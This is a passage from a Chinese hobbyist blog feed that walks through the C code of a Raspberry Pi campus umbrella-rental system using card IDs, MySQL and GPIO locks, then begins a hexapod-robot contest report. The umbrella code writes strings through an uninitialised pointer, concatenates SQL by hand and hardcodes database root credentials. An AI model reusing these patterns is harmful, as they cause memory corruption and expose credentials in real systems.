<h3 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h3><p>为了可能存在的读者按顺序贴代码，便于有兴趣的朋友验证：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql/mysql.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wiringPi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wiringSerial.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ID_LENTH 12</span></div><div class="line">MYSQL           mysql;</div><div class="line">MYSQL_RES       *res = <span class="literal">NULL</span>;</div><div class="line">MYSQL_ROW       row;</div><div class="line"><span class="keyword">int</span> user_num;</div><div class="line"><span class="keyword">struct</span> User&#123;</div><div class="line">	<span class="keyword">int</span> userID[ID_LENTH];</div><div class="line">	<span class="keyword">char</span> *returnFlag;</div><div class="line">	<span class="keyword">char</span> *name;</div><div class="line">	<span class="keyword">int</span> time;</div><div class="line">&#125;User[<span class="number">100</span>];</div></pre></td></tr></table></figure></p>
<p>这里是代码的头文件和变量定义部分，由于这个系统实在是太小了，没有采用分文件的形式，或者cpp面向对象的编程风格。<code>time.h</code>包含了我们需要使用的操作系统时间的函数。<code>wiringPi.h</code>和<code>wiringSerial.h</code>是raspi的函数库，可以它们来控制pi的GPIO和串口功能，用于读卡和电磁铁的开关电路控制，也是软件和硬件之间的桥梁。<code>mysql.h</code>提供了丰富的MySQL数据库的C语言APi，我们可以方便的通过C语言操作数据库。<br>全局变量主要有一个用户结构体：包含了用户ID、借还状态、姓名、借出时间四个成员。还有一些MySQL的结构体。他们使用全局变量的原因在于几乎所有的函数都在使用他们，在函数间传递反而会让程序变的冗长。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">idAuth</span><span class="params">(<span class="keyword">int</span> *testID)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> i,j,k = <span class="number">0</span>;</div><div class="line">	<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; user_num; j++) &#123;</div><div class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; ID_LENTH; i++) &#123;</div><div class="line">			<span class="keyword">if</span>(*(User[j].userID+i) != *(testID+i)) &#123;</div><div class="line">				k = <span class="number">0</span>;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			&#125;</div><div class="line">			k++;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(k == ID_LENTH) </div><div class="line">			<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(k == ID_LENTH)</div><div class="line">		<span class="keyword">return</span> j;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里是解决上述所谓问题1的代码，传入值为一个指针指向数组的首地址。这个值将由串口读回的数据传递。在系统启动时将数据库中的用户信息加载入内存，存入<code>User[]</code>数组结构体。这个函数遍历了所有数据库中用户的ID并和传入的数组比较，若配对成功则返回用户编号，配对失败返回-1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">timeAuth</span><span class="params">(<span class="keyword">int</span> time_O,<span class="keyword">int</span> time_I)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(((time_I - time_O &lt; <span class="number">0</span> &amp;&amp; time_I &gt; <span class="number">2</span>) || time_I - time_O &gt; <span class="number">2</span>) &amp;&amp; time_O != <span class="number">1000</span>)</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是解决所谓问题3的代码，传入两个参数，借伞时间和还伞时间。若还伞时间与借伞时间相差的数值大与2，则认为违规。在<code>tm</code>结构体中<code>p-&gt;tm_min</code>表示离当前小时0分钟的时间。若遇到整点前借伞整点后还伞的情况，两值之差为负数，只验证还伞时间是否大与2即可。我们将用户初始时间均置为1000。在用户时间值为默认的情况下不会认为用户违规。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">db_connect</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == mysql_init(&amp;mysql)) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"mysql_init(): %s\n"</span>, mysql_error(&amp;mysql));</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == mysql_real_connect(&amp;mysql,</div><div class="line">                        <span class="string">"localhost"</span>,</div><div class="line">                        <span class="string">"root"</span>,</div><div class="line">                        <span class="string">"ubuntu"</span>,</div><div class="line">                        <span class="string">"umbrella_db"</span>,</div><div class="line">                        <span class="number">0</span>,</div><div class="line">                        <span class="literal">NULL</span>,</div><div class="line">                        <span class="number">0</span>)) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"mysql_real_connect(): %s\n"</span>, mysql_error(&amp;mysql));</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Connected to MySQL \n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>连接数据库的函数，不用多说，每次对用户进行信息修改的时候都必须调用。如果连接不成功则返回-1并输出连接错误原因。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_db</span><span class="params">()</span> </span>&#123;  </div><div class="line">    	<span class="keyword">char</span>            *query_str = <span class="literal">NULL</span>;  </div><div class="line">    	<span class="keyword">int</span>             rc,i,j,fields;  </div><div class="line">    	<span class="keyword">int</span>             rows;  </div><div class="line">    	db_connect();</div><div class="line">	query_str = <span class="string">"select * from users"</span>;  </div><div class="line">    	rc = mysql_real_query(&amp;mysql, query_str, <span class="built_in">strlen</span>(query_str));  </div><div class="line">    	<span class="keyword">if</span> (<span class="number">0</span> != rc) &#123;  </div><div class="line">        	<span class="built_in">printf</span>(<span class="string">"mysql_real_query(): %s\n"</span>, mysql_error(&amp;mysql));  </div><div class="line">        	<span class="keyword">return</span> <span class="number">-1</span>;  </div><div class="line">    	&#125;  </div><div class="line">    	res = mysql_store_result(&amp;mysql);  </div><div class="line">    	<span class="keyword">if</span> (<span class="literal">NULL</span> == res) &#123;  </div><div class="line">        	 <span class="built_in">printf</span>(<span class="string">"mysql_restore_result(): %s\n"</span>, mysql_error(&amp;mysql));  </div><div class="line">         	<span class="keyword">return</span> <span class="number">-1</span>;  </div><div class="line">    	&#125;  </div><div class="line">    	rows = mysql_num_rows(res);  </div><div class="line">    	fields = mysql_num_fields(res);</div><div class="line">	user_num = rows;  </div><div class="line">    	<span class="built_in">printf</span>(<span class="string">"The total users is: %d\n"</span>, rows);</div><div class="line"> 	<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; rows; j++) &#123;</div><div class="line">		row = mysql_fetch_row(res);</div><div class="line">		<span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">13</span>; i++) &#123;</div><div class="line">			*(User[j].userID+i<span class="number">-1</span>) = atoi(row[i]);</div><div class="line">			User[j].name = row[<span class="number">13</span>];</div><div class="line">			User[j].returnFlag = row[<span class="number">14</span>];</div><div class="line">			User[j].time = atoi(row[<span class="number">15</span>]);	</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	mysql_close(&amp;mysql);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>读数据库信息函数。在程序启动后调用，<code>rc = mysql_real_query(&amp;mysql, query_str, strlen(query_str));</code>提交请求，如果请求成功，则数据库的值会存放在<code>row</code>这个变量中。我们按照之前定义的数据库规则用户结构体赋值。完成后断开连接，返回整型数1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_db_re</span><span class="params">(<span class="keyword">int</span> id,<span class="keyword">const</span> <span class="keyword">char</span> *re_state)</span> </span>&#123;</div><div class="line">	<span class="keyword">char</span> 		*str_1 = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span> 		*str_2 = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span> 		*str;</div><div class="line">	<span class="keyword">int</span>             rc;</div><div class="line">	str_1 = <span class="string">"UPDATE users SET return_state="</span>;</div><div class="line">	str_2 = <span class="string">" WHERE id_0="</span>;</div><div class="line">	<span class="keyword">char</span> temp[<span class="number">10</span>];</div><div class="line">	db_connect();</div><div class="line">	<span class="built_in">sprintf</span>(temp,<span class="string">"%d"</span>,id+<span class="number">1</span>);</div><div class="line">	<span class="built_in">strcat</span>(<span class="built_in">strcat</span>(<span class="built_in">strcat</span>(<span class="built_in">strcpy</span>(str,str_1),re_state),str_2),temp);</div><div class="line">	rc = mysql_real_query(&amp;mysql, str, <span class="built_in">strlen</span>(str));</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> != rc) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"mysql_real_query(): %s\n"</span>, mysql_error(&amp;mysql));</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">	mysql_close(&amp;mysql);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>写数据库用户状态函数。传入参数为要修改的用户序号和用户借还伞的状态。我们需要构造相应的MySQL语句来实现对应的功能。在这里我使用了 <code>strcpy(*str1,*str2)</code> 函数来连接字符串。将完整的MySQL语句分为下面四部分：<code>UPDATE users SET return_state=</code>，<code>*re_state</code><br>，<code>WHERE id_0=</code>，<code>id</code>,其中id使用<code>sprintf(temp,&quot;%d&quot;,id+1);</code>转换为字符串，连接后提交请求，验证成功后断开数据库连接。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_db_tm</span><span class="params">(<span class="keyword">int</span> id,<span class="keyword">int</span> time)</span> </span>&#123;</div><div class="line">	<span class="keyword">char</span>		*str_1 = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span>		*str_2 = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span> 		*str;</div><div class="line">	<span class="keyword">int</span> 		rc;</div><div class="line">	str_1 = <span class="string">"UPDATE users SET time="</span>;</div><div class="line">	str_2 = <span class="string">" WHERE id_0="</span>;</div><div class="line">	<span class="keyword">char</span> temp[<span class="number">10</span>];</div><div class="line">	<span class="keyword">char</span> tempNum[<span class="number">10</span>];</div><div class="line">	db_connect();</div><div class="line">	<span class="built_in">sprintf</span>(temp,<span class="string">"%d"</span>,id+<span class="number">1</span>);</div><div class="line">	<span class="built_in">sprintf</span>(tempNum,<span class="string">"%d"</span>,time);</div><div class="line">	<span class="built_in">strcat</span>(<span class="built_in">strcat</span>(<span class="built_in">strcat</span>(<span class="built_in">strcpy</span>(str,str_1),tempNum),str_2),temp);</div><div class="line">	rc = mysql_real_query(&amp;mysql, str, <span class="built_in">strlen</span>(str));</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> != rc) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"mysql_real_query(): %s\n"</span>, mysql_error(&amp;mysql));</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">	mysql_close(&amp;mysql);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>和上面的内容几乎完全一样，只是将借还表示更改为了时间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">user_function</span><span class="params">(<span class="keyword">int</span> userNum,<span class="keyword">int</span> reFlag)</span> </span>&#123;</div><div class="line">	<span class="keyword">time_t</span> timep;</div><div class="line">        <span class="keyword">struct</span> tm *p;</div><div class="line">        <span class="keyword">int</span>  flag;</div><div class="line">	<span class="keyword">int</span> time_I,time_O;</div><div class="line">        time(&amp;timep);</div><div class="line">        p = gmtime(&amp;timep);</div><div class="line">	system(<span class="string">"clear"</span>);</div><div class="line">	<span class="keyword">if</span>(timeAuth(User[userNum].time,p-&gt;tm_min) == <span class="number">0</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (reFlag == <span class="number">0</span>) &#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Take Your Umbrella!,%s\n"</span>,User[userNum].name);</div><div class="line">                	User[userNum].returnFlag = <span class="string">"1"</span>;</div><div class="line">			<span class="keyword">if</span>(write_db_tm(userNum,p-&gt;tm_min) == <span class="number">0</span>)</div><div class="line">				<span class="built_in">printf</span>(<span class="string">"Time has been recorded\n"</span>);</div><div class="line">               		<span class="keyword">if</span>(write_db_re(userNum,<span class="string">"1"</span>) == <span class="number">0</span>)  </div><div class="line">				<span class="built_in">printf</span>(<span class="string">"State has been updated\n"</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span> &#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"%s:have a nice day!\n"</span>,User[userNum].name);</div><div class="line">               	 	User[userNum].returnFlag = <span class="string">"0"</span>;</div><div class="line">			<span class="keyword">if</span>(write_db_tm(userNum,<span class="number">1000</span>) ==<span class="number">0</span> )</div><div class="line">				<span class="built_in">printf</span>(<span class="string">"Time record has been cleared\n"</span>);</div><div class="line">                	<span class="keyword">if</span>(write_db_re(userNum,<span class="string">"0"</span>) == <span class="number">0</span>) </div><div class="line">				<span class="built_in">printf</span>(<span class="string">"State has been updated\n"</span>);</div><div class="line">		&#125;</div><div class="line">		delay(<span class="number">3000</span>);</div><div class="line">        	digitalWrite(userNum,HIGH);</div><div class="line">        	delay(<span class="number">1000</span>);</div><div class="line">        	digitalWrite(userNum,LOW);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		delay(<span class="number">1000</span>);</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Blocked user!\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用户功能部分，也是上面函数综合使用。传入用户序号和借还标志。首先判断用户是否被ban和用户借还伞，若借伞则屏幕显示相应内容，写数据库借伞标志，写借伞时间。若还伞屏幕显示相应内容，数据库写还伞标志，置时间为默认(1000)。结束后调用GPIO功能，打开相应位置的锁扣。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> fd;</div><div class="line">	<span class="keyword">char</span> data[] = &#123;<span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0xC1</span>,<span class="number">0x20</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x17</span>&#125;;</div><div class="line">	<span class="keyword">int</span> readData;</div><div class="line">	<span class="keyword">int</span> ID[ID_LENTH];</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">	wiringPiSetup();</div><div class="line">	pinMode(<span class="number">0</span>,OUTPUT);</div><div class="line">	pinMode(<span class="number">1</span>,OUTPUT);</div><div class="line">	pinMode(<span class="number">2</span>,OUTPUT);</div><div class="line">	pinMode(<span class="number">3</span>,OUTPUT);</div><div class="line">	pinMode(<span class="number">4</span>,OUTPUT);</div><div class="line">	pinMode(<span class="number">5</span>,INPUT);</div><div class="line">	fd = serialOpen(<span class="string">"/dev/ttyAMA0"</span>,<span class="number">9600</span>);</div><div class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	system(<span class="string">"clear"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"System is Running...\n"</span>);</div><div class="line">	delay(<span class="number">2000</span>);</div><div class="line">	<span class="keyword">if</span>(read_db() == <span class="number">0</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Database is connected\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Copyright OUC:Industrial Automation\n"</span>);</div><div class="line">	serialPuts(fd,data);</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span>(digitalRead(<span class="number">5</span>) == <span class="number">1</span>) &#123;</div><div class="line">			<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; ID_LENTH; i++) &#123;</div><div class="line">				readData = serialGetchar(fd);</div><div class="line">				*(ID+i) = readData;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">if</span>(idAuth(ID) == <span class="number">-1</span>)&#123;</div><div class="line">				system(<span class="string">"clear"</span>);</div><div class="line">				<span class="built_in">printf</span>(<span class="string">"Permission denied!\n"</span>);</div><div class="line">				digitalWrite(<span class="number">0</span>,LOW);</div><div class="line">				delay(<span class="number">4000</span>);system(<span class="string">"clear"</span>);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span>&#123;</div><div class="line">				user_function(idAuth(ID),<span class="built_in">strcmp</span>(User[idAuth(ID)].returnFlag,<span class="string">"0"</span>));</div><div class="line">			&#125;</div><div class="line">		&#125;	</div><div class="line">	&#125;</div><div class="line">	serialClose(fd);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>主函数部分，首先初始化GPIO功能，打开串口，给串口模块发自动读卡指令，打印一些无关紧要的信息，好像很炫酷的样子。在循环部分，检测读卡信号，上升沿触发。读串口数据，首先验证ID，若未注册显示相关信息。若比对成功就按照上文提到的流程处理。  </p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>系统的运行图如下：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1fa6f3nlaf3j30rb0hrjsv.jpg" alt="界面"><br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1fa6f4oel0oj30rb0hrq4e.jpg" alt="用户借伞"><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1fa6f5bzfxaj31kw23ub29.jpg" alt="实际效果"><br><em>这里用LED小灯来测试GPIO电平翻转是否正确</em></p>
<blockquote>
<p>最后感慨一下：大概就是去年的这个时候我有了自己的Raspberry Pi，当时用了<code>RPi.GPIO</code>点亮了一盏小灯就开心的不行。现在终于可以熟练的使用Pi的两个GPIO库，可以自己用它做一个小系统了。当然做这个系统遇到了不少困难，好在Linux编程资料不少，</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;这篇文章是机器人实验课的项目记录。这个项目的目标是制作一个校园雨伞租赁系统，师生只需要刷校园卡就可以从伞架借走一把伞，还伞的时候只需要刷卡就可以归还。功能看起来很简单，但让这个系统稳定合理的工作却花了我不少时间。&lt;/p&gt;
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Pi" scheme="https://hsmouc.com/tags/Pi/"/>
    
      <category term="C" scheme="https://hsmouc.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>六足机器人技术报告</title>
    <link href="https://hsmouc.com/2016/10/22/2016-10-22-robot/"/>
    <id>https://hsmouc.com/2016/10/22/2016-10-22-robot/</id>
    <published>2016-10-22T12:15:23.000Z</published>
    <updated>2016-10-23T15:51:53.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>这是我们参加山东省高校第五届机器人大赛六足机器人比赛的技术报告，使用的是青岛德林科姆公司开发的商业机器人。这里不得不吐槽一下这玩意的问题真的好多，具体来说就是六足机器人的概念，从各种地方拼凑了一份代码。代码的每一部分看起来都有点道理，但是拼在一起就完全不对了(._.)在这里整理一下我们修改过的代码和比赛项目的实现思路。<a id="more"></a> 
</li>
</ul>
<h3 id="机器人的总体设计"><a href="#机器人的总体设计" class="headerlink" title="机器人的总体设计"></a>机器人的总体设计</h3><p>这个是班主任公司搞的机器人，具体优点就不多说了。单片机选用了我们比较熟悉的飞思卡尔公司的K60，机器人运动是由18路数字舵机组成的六条腿实现的，正常行走使用的是传统的三足步态，如下图：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f91aunjx6sj30id0fr3zx.jpg" alt="三角步态"><br>考虑到六足机器人的地形适应性比较强，所以我们还使用了一种多边形步态，如下图：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f91axvle0lj30q20hh765.jpg" alt="多边形步态"><br>机器人配备了MPU6050(姿态传感器)，红外传感器(用于避障),数字摄像头，超声波传感器(可以测距)，机器人的大概样子如下：<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f91b1p0d2fj31kw16oqao.jpg" alt="机器人外观"><br>上面那个盖子正前方的中间放有摄像头，红外，超声波传感器(在图片没拍到的那一端)，这个摄像头的位置安排很不科学，等下在介绍比赛规则的时候再详细说。</p>
<h3 id="比赛内容和实现思路"><a href="#比赛内容和实现思路" class="headerlink" title="比赛内容和实现思路"></a>比赛内容和实现思路</h3><ul>
<li>这个比赛分为两项内容：自主循迹和创意表演.  </li>
</ul>
<p>自主循迹要求机器人按规定的路径自主循迹到达终点，轨迹如下图：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f91bh0aau9j30k60eoq3p.jpg" alt="比赛场地"><br>另一项是创意表演，表演内容自定，我们设计的是自主爬楼梯和悬崖预警两个项目。</p>
<h3 id="自主循迹的工作流程"><a href="#自主循迹的工作流程" class="headerlink" title="自主循迹的工作流程"></a>自主循迹的工作流程</h3><p>该部分包含摄像头图像处理部分和舵机控制部分，下面分别介绍：  </p>
<h4 id="摄像头的图像处理"><a href="#摄像头的图像处理" class="headerlink" title="摄像头的图像处理"></a>摄像头的图像处理</h4><p>先说原来不合理的摄像头位置，原先的摄像头视角是水平的，和机器人运动的方向相同，这样子的话看到的赛道面积就非常小。我们按飞思卡尔比赛摄像头车的方案设计了一个摄像头支架，重新安装了摄像头。如图：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f91cvf94naj30qo0f00tk.jpg" alt="摄像头支架"><br>这个系统使用了OmniVision公司生产的OV7725摄像头，该摄像头具有硬件二值化的功能，即图像采集完只有0xFF(白色)和0x00(黑色)两种情况。这种方式大大节省了单片机的资源，使其不需要分奇偶场来采集图像，同时二值化的图像简化了处理的算法，不需要计算灰度阈值来寻找边界。下面介绍该摄像头的配置：<br>    该摄像头的配置接口为标准的SCCB(Serial Camera Control Bus)，这种串行相机控制总线的实质和我们使用的IIC总线类似，有一根时钟线和一根数据线。OV7725寄存器的配置见附件代码。配置好摄像头后还需要对SCCB传回的数据进行转换，这里详细介绍：<br>SCCB总线输出的数据为8bits，即八个像素点为一个数据。由于我们需要得知图像中每一个像素点的情况，需要将其解压，在这里提供一个解压图像的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">void img_extract(u8 *data1,u8 *data2,u16 lenth)</div><div class="line">&#123;</div><div class="line">    u8  color[2] = &#123;0,255&#125;;</div><div class="line">    u8  temp;</div><div class="line">    while(lenth--)</div><div class="line">    &#123;</div><div class="line">        temp = *data1++;</div><div class="line">		 *data2++ = color[(temp &gt;&gt; 7) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 6) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 5) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 4) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 3) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 2) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 1) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 0) &amp; 0x01];</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
